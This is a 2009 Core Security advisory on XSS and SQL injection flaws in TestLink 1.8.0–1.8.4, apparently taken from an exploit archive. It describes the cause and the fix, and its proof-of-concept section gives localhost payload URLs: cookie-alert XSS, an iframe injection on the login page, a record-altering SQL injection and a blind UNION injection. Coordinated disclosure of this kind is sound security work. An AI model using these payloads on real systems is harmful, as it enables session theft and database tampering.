@@ -1,0 +1,197 @@
+id: 10124
+date: 12/09/2009
+title: Multiple XSS Injection Vulnerabilities in TestLink Test Management
+author: Core Security
+cves: 
+
+=======================================================================================
+Multiple XSS Injection Vulnerabilities in TestLink Test Management and Execution System
+=======================================================================================
+
+                                Core Security Technologies - CoreLabs
+Advisory
+                                         
+http://www.coresecurity.com/corelabs/
+ 
+Multiple XSS and Injection Vulnerabilities in TestLink Test Management
+and Execution System
+ 
+ 
+1. *Advisory Information*
+ 
+Title: Multiple XSS and Injection Vulnerabilities in TestLink Test
+Management and Execution System
+Advisory Id: CORE-2009-1013
+Advisory URL:
+http://www.coresecurity.com/content/testlink-multiple-injection-vulnerabilities
+Date published: 2009-12-09
+Date of last update: 2009-12-09
+Vendors contacted: TestLink Community
+Release mode: Coordinated release
+ 
+ 
+2. *Vulnerability Information*
+ 
+Class: Cross site scripting [CWE-79], SQL injection [CWE-89]
+Impact: Code execution
+Remotely Exploitable: Yes
+Locally Exploitable: No
+Bugtraq ID: 37258
+CVE Name: CVE-2009-4237, CVE-2009-4238
+ 
+ 
+3. *Vulnerability Description*
+ 
+ Multiple injection (both XSS [1] and SQL) vulnerabilities have been
+discovered in Testlink [2], a widely used test-case management
+application written in PHP [3]. One of the XSS vulnerabilities,
+discovered in its login screen, can be exploited without an
+authenticated session.
+ 
+ 
+4. *Vulnerable packages*
+ 
+   . TestLink 1.8.0
+   . TestLink 1.8.1
+   . TestLink 1.8.2
+   . TestLink 1.8.3
+   . TestLink 1.8.4
+   . Older versions are probably affected too, but they were not checked.
+ 
+ 
+5. *Non-vulnerable packages*
+ 
+   . TestLink 1.8.5
+ 
+ 
+6. *Solutions and Workarounds*
+ 
+ Upgrade to a non-vulnerable version, such as 1.8.5. TestLink features
+the option to upgrade a current installation in its install scripts.
+ 
+ 
+7. *Credits*
+ 
+ These vulnerabilities were discovered and researched by Pablo
+Annetta, from Core Security Technologies, during Core Bugweek 2009 as
+a member of the "Los Herederos de Don Pablo (HDP)" team.
+ 
+ 
+8. *Technical Description / Proof of Concept Code*
+ 
+ Most of these vulnerabilities are present in the Testlink code
+because the logic for the sanitization of user input is rudimentary.
+Each script sanitizes its own input, instead of abstracting this task
+to another layer of logic. Often only slashes are stripped, but html
+entities are almost never escaped.
+ 
+ The only vulnerability in this report that can be exploited without
+an authenticated session is a XSS vulnerability in Testlink's login
+page 'login.php'. This script gets a parameter named 'req', which is
+used by the application to set the next request to be made. All
+parameters are initialized in the 'init_args' function which doesn't
+sanitize its arguments appropriately as seen below.
+ 
+/-----
+function init_args()
+{
+    $args = new stdClass();
+    $_REQUEST = strings_stripSlashes($_REQUEST);
+     
+    $args->note = isset($_REQUEST['note']) ? $_REQUEST['note'] : null;
+    $args->login = isset($_REQUEST['tl_login']) ?
+trim($_REQUEST['tl_login']) : null;
+    $args->pwd = isset($_REQUEST['tl_password']) ?
+$_REQUEST['tl_password'] : null;
+ 
+    $args->reqURI = isset($_REQUEST['req']) ? $_REQUEST['req'] : null;
+    $args->preqURI = (isset($_REQUEST['reqURI']) &&
+strlen($_REQUEST['reqURI'])) ? $_REQUEST['reqURI'] : null;
+  
+    return $args;
+}
+- -----/
+ 
+ This vulnerability can be verified by issuing the following request
+to a Testlink installation on localhost:
+ 
+/-----
+http://127.0.0.1/testlink/login.php?req=";><iframe src
+="http://www.coresecurity.com/content/xxxx"; width="100%"
+height="300"></iframe>
+- -----/
+ 
+ 
+ Other XSS vulnerabilities on different scripts can be exploited with
+an authenticated session. Proof of concept code follows:
+ 
+/-----
+http://127.0.0.1/testlink/lib/general/staticPage.php?key=";><script>alert(document.cookie)</script>
+ 
+http://127.0.0.1/testlink/lib/attachments/attachmentupload.php?id=1&tableName='<script>alert(document.cookie)</script>
+http://127.0.0.1/testlink/lib/events/eventviewer.php?startDate=";<script>alert(document.cookie)</script>
+http://127.0.0.1/testlink/lib/events/eventviewer.php?endDate=";<script>alert(document.cookie)</script>
+http://127.0.0.1/testlink/lib/events/eventviewer.php?logLevel=";<script>alert(document.cookie)</script>
+- -----/
+ 
+ 
+ There are more XSS attacks that can be executed with *an
+authenticated session* on installations that have *at least one test
+plan created*. Most of these are due to an 'echo' statement in
+TestLink's database functions that directly outputs SQL errors back to
+the browser without escaping html entities. This can be found on line
+181 of 'testlink/lib/functions/database.class.php', where some
+function such as 'htmlspecialchars' should be called on '
+$this->error($p_query)' and '$message'. A templating engine (TestLink
+uses Smarty for many other tasks) could also be used to output these
+errors.
+ 
+/-----
+if ( !$t_result ) {
+    echo "ERROR ON exec_query() - database.class.php <br>" .
+$this->error($p_query) . "<br>";
+  echo "<br> THE MESSAGE :: $message. "<br>";
+    return false;
+} else {
+    return $t_result;
+}
+- -----/
+ 
+ This proof of concept code triggers the vulnerabilities described above:
+ 
+/-----
+http://127.0.0.1//testlink/lib/testcases/searchData.php?doSearch=find&summary='&expected_results='<script>alert(document.cookie)</script>
+http://127.0.0.1//testlink/lib/testcases/searchData.php?doSearch=find&summary='&name=<script>alert(document.cookie)</script>
+http://127.0.0.1//testlink/lib/testcases/searchData.php?doSearch=find&summary='&steps=<script>alert(document.cookie)</script>
+http://127.0.0.1//testlink/lib/testcases/searchData.php?doSearch=find&summary='<script>alert(document.cookie)</script>
+- -----/
+ 
+ More XSS vulnerabilities can also be triggered because of the problem
+described above, but also because another independent XSS exists on
+'resultsMoreBuilds_buildReport.php' caused by not escaping the
+'search_notes_string', by issuing this request (also when logged into
+an installation with a Test Plan created):
+ 
+/-----
+http://127.0.0.1/testlink/lib/results/resultsMoreBuilds_buildReport.php?report_type=0&display_query_params=1&search_notes_string=</td><script>alert(document.cookie)</script>
+- -----/
+ 
+ 
+ With an authenticated session, the following SQL injection bug can
+also be exploited.
+ 
+ In 'http://127.0.0.1/testlink/lib/general/navBar.php', filling in the
+'Test Case ID' field with 'TC-1 or 1 = 1 update tcversions set summary
+= '</td><script>alert(document.cookie)</script><td>'' results in
+reflected HTML.
+ 
+ Also with an authenticated session the following blind SQL injection
+exists
+ 
+/-----
+http://127.0.0.1/testlink/lib/events/eventviewer.php?logLevel=1,1)%20union%20SELECT%20id%20FROM%20testplans%20%23
+------/
+
+
+
+#  0day.today [2023-03-24]  #
